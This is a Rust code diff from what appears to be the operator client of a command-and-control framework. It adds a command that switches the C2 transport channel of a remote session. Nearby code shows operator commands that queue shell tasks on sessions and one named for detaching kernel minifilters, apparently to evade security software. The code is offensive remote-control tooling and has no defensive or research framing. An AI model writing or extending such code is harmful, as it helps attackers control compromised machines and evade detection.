@@ -337,6 +337,11 @@ pub enum Cmd {
     Trex {
         session: String,
     },
+    /// Set C2 transport channel.
+    SetChannel {
+        session: String,
+        channel: u8,
+    },
     Shutdown,
 }
 
@@ -1547,6 +1552,17 @@ async fn worker_loop(
                             pending.push(PendingTask { session: session.clone(), task_id: tid, kind: TaskKind::Shell(ParseAs::None), backoff: Duration::from_secs(5), last_poll: Instant::now(), started_at: Instant::now(), saw_eof: false, chunks: Vec::new() });
                         }
                         Err(e) => log_push(&mut log_buf, &format!("! trex enqueue: {e}"), Level::Err),
+                    }
+                }
+                Cmd::SetChannel { session, channel } => {
+                    let Some((ref srv, ref tok)) = server else {
+                        log_push(&mut log_buf, "! not connected", Level::Err);
+                        continue;
+                    };
+                    let cmd = serde_json::json!({ "type": "setchannel", "channel": channel });
+                    match enqueue_simple(&client, srv, &session, cmd, tok).await {
+                        Ok(tid) => log_push(&mut log_buf, &format!("[{}] channel set → task {tid}", short(&session)), Level::Info),
+                        Err(e) => log_push(&mut log_buf, &format!("! channel enqueue: {e}"), Level::Err),
                     }
                 }
                 Cmd::KernelDetachMinifilter => {
